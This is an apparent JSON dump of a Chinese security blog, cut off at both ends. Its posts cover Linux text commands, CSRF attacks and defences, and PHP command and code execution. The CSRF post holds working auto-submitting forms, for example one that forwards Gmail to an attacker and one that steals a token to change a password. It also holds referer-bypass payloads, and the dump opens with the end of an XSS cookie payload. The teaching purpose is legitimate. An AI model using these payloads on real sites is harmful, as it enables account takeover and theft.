onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"Linux命令","slug":"Linux命令","date":"2018-12-11T22:45:12.000Z","updated":"2020-11-16T07:06:11.509Z","comments":true,"path":"2018/12/12/Linux命令/","link":"","permalink":"http://s1eady.top/2018/12/12/Linux%E5%91%BD%E4%BB%A4/","excerpt":"","text":"Linux命令tr命令介绍tr命令主要用于删除文件中控制字符或进行字符转换。 tr命令格式： 1tr [ -d ] [ -c ] [ -s ] [ 字符串1 ] [ 字符串2 ] 文件名。其中字符串1用于查询，字符串2用于处理各种转换。 123-c 用字符串1中字符集的补集替换此字符集，要求字符集为ASCII。-d 删除字符串1中所有输入字符。-s 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。 常用字符类 1234567891011[:alnum:]：字母和数字[:alpha:]：字母[:cntrl:]：控制（非打印）字符[:digit:]：数字[:graph:]：图形字符[:lower:]：小写字母[:print:]：可打印字符[:punct:]：标点符号[:space:]：空白字符[:upper:]：大写字母[:xdigit:]：十六进制字符 实例操作删除换行和替换换行为空 123456789101112131415steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt12345678910steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt | tr -d &quot;\\n&quot;12345678910steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt | tr &quot;\\n&quot; &quot; &quot;1 2 3 4 5 6 7 8 9 10 只删除数字或者字母 123456steady@steady:~$ cat steady.txt2346tre2345r3rgegf43tr4rf3gef s&#x2F;.,affffuioeufoifskf&#x2F;,&#x2F;,&#39;l245steady@steady:~$ cat steady.txt | tr -d &quot;[0-9]&quot;trerrgegftrrfgef s&#x2F;.,affffuioeufoifskf&#x2F;,&#x2F;,&#39;lsteady@steady:~$ cat steady.txt | tr -d &quot;[a-zA-Z]&quot;2346234534343 &#x2F;.,&#x2F;,&#x2F;,&#39;245 删除非字母的数据 12steady@steady:~$ cat steady.txt | tr -d -c &quot;[a-zA-Z]&quot;trerrgegftrrfgefsaffffuioeufoifskfl 去除重复字符串 12345678steady@steady:~$ cat steady.txt12222 easdsssss asd2w111steady@steady:~$ cat steady.txt | tr -s &quot;2&quot;12 easdsssss asd2w111steady@steady:~$ cat steady.txt | tr -s &quot;2s&quot;12 easds asd2w111steady@steady:~$ cat steady.txt | tr -s &quot;2s1&quot;12 easds asd2w1 grep命令介绍grep（global search regular expression(RE)and print out the line 即：全面搜索正则表达式并把行打印出来）命令是一个强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。 12345678[root@www ~]# grep [-acinv] [--color&#x3D;auto] &#39;搜寻字符串&#39; filename选项与参数：-a ：将 binary 文件以 text 文件的方式搜寻数据-c ：计算找到 &#39;搜寻字符串&#39; 的次数-i ：忽略大小写的不同，所以大小写视为相同-n ：顺便输出行号-v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！--color&#x3D;auto ：可以将找到的关键词部分加上颜色的显示喔！ 实例操作123456789101112steady@steady:~$ cat steady.txt | grep &quot;steady&quot;gjhgsteadysteady897jhgjsteady7678678steady87686steady@steady:~$ cat steady.txt | grep -v &quot;steady&quot;gongxinaojgl123456gjhgsteady@steady:~$ cat steady.txt | grep -v -n &quot;steady&quot;3:gongxinaojgl5:123456gjhg7: sedsed 字符串替换sed替换的基本语法为: 1sed &#39;s&#x2F;原字符串&#x2F;替换字符串&#x2F;&#39; 命令中的三根斜线分隔符可以换成别的符号,有时候替换目录字符串的时候有较多斜线，这个时候换成其它的分割符是较为方便,只需要紧跟s定义即可。 一些特殊字符的使用： 123 &quot;^&quot;表示行首 &quot;$&quot;符号如果在引号中表示行尾，但是在引号外却表示末行(最后一行) 例子 1234567# 注意这里的 &quot;&amp;&quot; 符号，如果没有 &quot;&amp;&quot;&quot;，就会直接将匹配到的字符串替换掉sed &#39;s&#x2F;^&#x2F;添加的头部&amp;&#x2F;g&#39; #在所有行首添加sed &#39;s&#x2F;$&#x2F;&amp;添加的尾部&#x2F;g&#39; #在所有行末添加sed &#39;2s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换第2行sed &#39;$s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换最后一行sed &#39;2,5s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换2到5行sed &#39;2,$s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换2到最后一行 awk命令介绍awk 命令的基本格式 1awk [options] &#39;script&#39; file options 这个表示一些可选的参数选项，script 表示 awk 的可执行脚本代码（一般被&#123;&#125; 花括号包围），这个是必须的。file 这个表示 awk 需要处理的文件，注意需要是纯文本文件（意味着 awk 能够处理）。 变量 变量NF表示当前行有多少个字段，因此$NF就代表最后一个字段。 $(NF-1)代表倒数第二个字段。 函数 1234567tolower()：字符转为小写。length()：返回字符串长度。substr()：返回子字符串。sin()：正弦。cos()：余弦。sqrt()：平方根。rand()：随机数。 实例操作123456789101112131415161718192021222324252627steady@steady:~$ cat steady.txtavahi:x:124:130:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinnm-openvpn:x:125:131:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologinnm-openconnect:x:126:132:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologinpulse:x:127:134:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinsaned:x:128:136::/var/lib/saned:/usr/sbin/nologininetsim:x:129:138::/var/lib/inetsim:/usr/sbin/nologincolord:x:130:139:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:131:140::/var/lib/geoclue:/usr/sbin/nologinlightdm:x:132:141:Light Display Manager:/var/lib/lightdm:/bin/falseking-phisher:x:133:142::/var/lib/king-phisher:/usr/sbin/nologinsteady:x:1000:1000:steady,,,:/home/steady:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsteady@steady:~$ cat steady.txt | awk -F &quot;:&quot; &#x27;&#123;print $1 $2&#125;&#x27;avahixnm-openvpnxnm-openconnectxpulsexsanedxinetsimxcolordxgeocluexlightdmxking-phisherxsteadyxsystemd-coredumpx wc利用wc指令我们可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为”-“，则wc指令会从标准输入设备读取数据。 1-l或--lines 只显示行数。 sortsort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 12345678910111213141516171819202122232425steady@steady:~/桌面/steady/output/png$ cat flag.txt gong xinao aobswdhhdawrtqzzssteady@steady:~/桌面/steady/output/png$ sort flag.txt aobsdawgong xinao hrtqwdhzzs -u选项输出行中去除重复行。 123456789101112131415161718192021222324252627282930313233343536steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png$ cat flag.txt gong xinao aobswdhhdawrtqzzsaabcddddsteady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png$ sort -u flag.txt aaobbscddawdddgong xinao hrtqwdhzzs -r选项sort默认的排序方式是升序，如果想改成降序，就加个-r就搞定了。 -o选项把排序结果输出到原文件中。 -n选项以数值来排序. -t与-k选项-t选项，后面可以设定间隔符。 -k选项，来指定列数。 12345678910steady@steady:~/桌面/steady/output/png$ sort -n -k 2 -t : flag.txtapple:10:2.5orange:20:3.4banana:30:5.5pear:90:2.3steady@steady:~/桌面/steady/output/png$ cat flag.txt banana:30:5.5apple:10:2.5pear:90:2.3orange:20:3.4 去重复1sort -u odLinux od命令用于输出文件内容。 od(octal dump)命令可以以八进制、十进制、十六进制和ASCII码的格式来显示文件或者流，它们对于访问或可视地检查文件中不能直接显示在终端上的字符（如换行符等）很有用。此外，在一些有空洞的文件中可以通过od命令查看空洞的位置。 1od [-A 地址进制] [-t 显示格式] 文件名 -A ( 地址进制)按指定的进制显示地址信息;-t 指定数据显示的格式。 -A-A 指定的地址进制包括： 1234567-A, --address-radix&#x3D;RADIX 在输出中以何种格式来表示地址偏移，其中RADIX的可选值有[doxn]。d表示Decimal, o表示Octal，x表示Hex，n表示None o：八进制（系统默认值） d：十进制 x：十六进制 n：不打印位移值 -t-t 指定数据的显示格式的主要参数有： 123456789-t, --format&#x3D;TYPE 指定输出格式，格式包括a、c、d、f、o、u和x，各含义如下： 1) a: named character, ignoring high-order bit 2) c: select printable characters or backslash escapes 3) d[SIZE]：十进制，正负数都包含，SIZE字节组成一个十进制整数； 4) f[SIZE]：浮点，SIZE字节组成一个浮点数； 5) o[SIZE]：八进制，SIZE字节组成一个八进制数； 6) u[SIZE]：无符号十进制，只包含正数，SIZE字节组成一个无符号十进制整数； 7) x[SIZE]：十六进制，SIZE字节为单位以十六进制输出，即输出时一列包含SIZE字节 例子12steady@steady:~$ pwd | od -A n -t x1 2f 68 6f 6d 65 2f 73 74 65 61 64 79 0a 12steady@steady:~$ pwd | od -A n -t x1 | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;2f686f6d652f7374656164790a tr去掉空行1tr -s &quot;\\n&quot; 1steady@steady:~&#x2F;桌面&#x2F;steady$ tshark -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng -T fields -e &quot;data&quot; | tr -s &quot;\\n&quot; xxdxxd 命令可以将指定文件或标准输入以十六进制转储，也可以把十六进制转储转换成原来的二进制形式。 -r逆向操作: 把xxd的十六进制输出内容转换回原文件的二进制内容。 -p以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。 十六进制转化成ascii1xxd -r -p 1steady@steady:~$ xxd -r -p 1.txt head语法 1head(选项)(参数) 选项 1234-n&lt;数字&gt;：指定显示头部内容的行数；-c&lt;字符数&gt;：指定显示头部内容的字符数；-v：总是显示文件名的头信息；-q：不显示文件名的头信息。 diff介绍diff 命令是 linux上非常重要的工具，用于比较文件的内容，特别是比较两个版本不同的文件以找到改动的地方。diff在命令行中打印每一个行的改动。最新版本的diff还支持二进制文件。 使用123456789-a diff预设只会逐行比较文本文件-b 不检查空格字符的不同-W 在使用-y参数时，指定栏宽-x 不比较选项中所指定的文件或目录-X 您可以将文件或目录类型存成文本文件，然后在&#x3D;&lt;文件&gt;中指定此文本文件-y 以并列的方式显示文件的异同之处--help 查看帮助信息--left-column 在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容--suppress-common-lines 在使用-y参数时，仅显示不同之处 hexdump介绍一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件的十六进制，而不只限于二进制文件。 123456789101112131415161718-n length：格式化输出文件的前length个字节-C：输出规范的十六进制和ASCII码-b：单字节八进制显示-c：单字节字符显示-d：双字节十进制显示-o：双字节八进制显示-x：双字节十六进制显示-s：从偏移量开始输出-e 指定格式字符串，格式字符串由单引号包含，格式字符串形如：’a/b “format1” “format2”。每个格式字符串由三部分组成，每个由空格分割，如a/b表示，b表示对每b个输入字节应用format1格式，a表示对每个a输入字节应用format2，一般a&gt;b，且b只能为1,2,4，另外a可以省略，省略a=1。format1和format2中可以使用类似printf的格斯字符串。%02d：两位十进制%03x：三位十六进制%02o：两位八进制%c：单个字符等%_ad：标记下一个输出字节的序号，用十进制表示%_ax：标记下一个输出字节的序号，用十六进制表示%_ao：标记下一个输出字节的序号，用八进制表示%_p：对不能以常规字符显示的用.代替同一行显示多个格式字符串，可以跟多个-e选项 使用格式化输出从20开始的10个字节，并以16进制显示。 1hexdump -n 10 -C -s 20 Linux系统快速查找文件的技巧locatelocate用于快速查找任何文件。它从一个系统数据库进行文件查找，而不需要遍历磁盘，因此速度极快。 1234567常见选项如下：-e 仅查找存在的文件-q 安静模式，不会显示任何错误讯息-n 至多显示 n个输出-r 使用正规运算式-i 查找忽略大小写-c 打印匹配结果数量 whichwhich命令会在PATH变量指定的路径中，搜索某个系统命令的位置。 whereiswhereis命令用于搜索程序的二进制文件，源代码文件或帮助文档。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/tags/Linux/"}]},{"title":"CSRF漏洞","slug":"CSRF漏洞总结","date":"2018-12-08T09:12:08.000Z","updated":"2020-10-16T11:58:14.062Z","comments":true,"path":"2018/12/08/CSRF漏洞总结/","link":"","permalink":"http://s1eady.top/2018/12/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"CSRF漏洞总结Gmail的CSRF漏洞黑客诱惑受害者点击藏有恶意代码的空白页面 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”&#104;&#97;&#x63;&#107;&#101;&#114;&#x40;&#104;&#x61;&#107;&#x65;&#x72;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;“。 漏洞原理攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com伪装受害者的身份向c.com 发送了一个请求。 c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。 漏洞类型GET类型的CSRF只需要一个HTTP请求： 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; 在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。 POST类型的CSRF使用的是一个自动提交的表单 123456 &lt;form action=&quot;http://bank.example/withdraw&quot; method=POST&gt; &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;10000&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。 链接类型的CSRF此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。 1&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt; 漏洞特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 利用思路1、无需任何验证即可删除某社区的帖子 1http://zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946 2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息 3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作 4、敏感操作: 刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论 利用payload1、get型–构造url 2、post型–burp可以直接生成poc 3、结合存储型xss,存放我们的csrfpoc 绕过思路1、Token绕过页面表单会生成一个token,执行操作的时候需要带上token 结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站 attach()函数用于获取user_token 一个iframe标签用于隐藏访问获取一个Token 一个form表单用于将修改的密码与Token进行提交数据库 12345678910111213141516&lt;script type=&quot;text/javascript&quot;&gt;function attack()&#123; document.getElementsByName(&#x27;user_token&#x27;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#x27;user_token&#x27;)[0].value; document.getElementById(&quot;transfer&quot;).submit();&#125;&lt;/script&gt;&lt;iframe src=&quot;http://192.168.0.1/xxx&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/xxx&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;/body&gt; token在url中可见+请求包的referer字段 让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token 使用JSONP跨域去请求Token 前提 请求是不检查Referer 使用JSONP去跨域生成Token 回传参数可以得出，默认为callback 能够fuzz出一定回调参数的值 利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击 ▲ Token的值也可能与其他参数有关 2、referer绕过根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求 目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误 csrfpoc使用html代码 &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; 比如 12345678910111213&lt;html&gt; &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt; &lt;form action=&quot;http://www.baidu.com/setProfile&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nickname&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;1&amp;#64;1&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;team&quot; value=&quot;new22&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;address&quot; value=&quot;new33&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 用户可以设置浏览器不传递referer 使用协议绕过 利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 利用data:协议 1234567&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/body&gt;&lt;/html&gt;payload:&lt;form method=post action=http://a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt; 利用https协议 https向http跳转的时候Referer为空 payload在https环境下 1&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt; attack.php写上CSRF攻击代码 Referrer Policy 隐藏referrer 1&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。 绕过后台逻辑判断 可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字) 3、jsonp跨域劫持通过发起jsonp请求，拿到服务端发回的token 防御思路1、验证码优点： 验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF 缺点： 无法大量部署。影响用户体验。不能每一步都加上验证码。 2、二次验证检查请求来源 优点: 检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。 缺点: 用户为了保护隐私，自己阻止了浏览器发送 referer 攻击者可以让自己的页面不发送 referer：这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面 如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏 3、Token那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。 CSRF Token的防护策略分为三个步骤： 1.将CSRF Token输出到页面中 Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。 2.页面提交的请求携带这个Token 对于GET请求，Token将附在请求地址之后。 对于 POST 请求来说，要在 form 的最后加上。 1&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt; 3.服务器验证Token是否正确 Token的分布式校验 Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。 4、同源检测服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。 注意： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。 5、双重cookie双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 6、Samesite Cookie属性Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。 Samesite=Strict 严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。 淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。 Samesite=Lax 宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。 123Set-Cookie: foo&#x3D;1; Samesite&#x3D;StrictSet-Cookie: bar&#x3D;2; Samesite&#x3D;LaxSet-Cookie: baz&#x3D;3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"命令执行与代码执行","slug":"命令执行与代码执行","date":"2018-12-08T09:12:08.000Z","updated":"2020-11-16T08:43:59.752Z","comments":true,"path":"2018/12/08/命令执行与代码执行/","link":"","permalink":"http://s1eady.top/2018/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"命令执行与代码执行命令执行原理是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。 命令执行常见利用符号1234command1&amp;command2 两个命令同时执行command1&amp;&amp;command2 只有前面命令执行成功，后面命令才继续执行command1;command2 不管前面命令执行成功没有，后面的命令继续执行command1||command2 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令 命令执行常见函数syetem() 1➜ ~ php -r &quot;system(&#39;whoami&#39;);&quot; passthru() 1➜ ~ php -r &quot;passthru(&#39;whoami&#39;);&quot; exec() 1➜ ~ php -r &quot;echo exec(&#39;whoami&#39;);&quot; 执行给予的命令command，不过它并不会输出任何东西 shell_exec() 1➜ ~ php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot; `反引号 1➜ ~ php -r &quot;echo @&#96;whoami&#96;;&quot; ob_start() 12345&lt;?php ob_start(&quot;system&quot;); echo &quot;whoami&quot;; ob_end_flush();?&gt; 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。 内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。 处理无回显的命令执行1、使用vps进行监听 2、利用ceye平台 代码执行原理应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。 代码执行常见函数eval() 把字符串 code 作为PHP代码执行，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾，eval() 返回 NULL。 assert() 把字符串 $assertion 作为PHP代码执行，assert($assertion) 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动，如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 preg_replace() 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int 